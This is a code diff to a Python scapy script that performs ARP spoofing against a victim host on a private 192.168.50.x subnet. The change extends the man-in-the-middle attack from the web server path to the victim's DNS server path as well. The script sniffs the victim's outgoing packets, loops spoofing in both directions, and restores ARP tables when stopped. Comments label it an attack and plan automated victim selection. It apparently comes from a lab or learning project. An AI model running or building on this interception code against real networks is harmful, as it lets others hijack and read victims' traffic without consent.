@@ -4,7 +4,8 @@ import threading
 
 #Define victim IP and Server IP -> automatize, let user select victim also implement sniffing instead of spamming
 VICTIM_IP = "192.168.50.20"
-SERVER_IP = "192.168.50.40"
+DNS_SERVER_IP = "192.168.50.30"
+WEB_SERVER_IP = "192.168.50.40"
 INTERFACE = "eth1"
 NETWORK_RANGE = "192.168.50.0/24"
 
@@ -38,7 +39,7 @@ def sniff_outgoing_packets(victim_ip):
     print(f"Starting to sniff outgoing packets from {victim_ip}...")
     scapy.sniff(prn=packet_callback, filter=f"ip src {victim_ip}", store=0, iface=INTERFACE)
 
-def run_spoofing(victim=VICTIM_IP, server=SERVER_IP):
+def run_spoofing(victim=VICTIM_IP, server=WEB_SERVER_IP):
     # Start sniffing thread
     sniff_thread = threading.Thread(target=sniff_outgoing_packets, args=(victim,), daemon=True)
     sniff_thread.start()
@@ -49,7 +50,8 @@ def run_spoofing(victim=VICTIM_IP, server=SERVER_IP):
         while True:
             spoof(victim, server)
             spoof(server, victim)
-            
+            spoof(victim,DNS_SERVER_IP)
+            spoof(DNS_SERVER_IP,victim)
             sent_packets_count = sent_packets_count + 2
             print(f"\rPackets Sent: {sent_packets_count}", end="")
             
@@ -58,6 +60,8 @@ def run_spoofing(victim=VICTIM_IP, server=SERVER_IP):
     except KeyboardInterrupt:
         restore(victim, server)
         restore(server, victim)
+        restore(victim,DNS_SERVER_IP)
+        restore(DNS_SERVER_IP,victim)
         print("\nAttack stopped and ARP tables restored")
 
 def main():
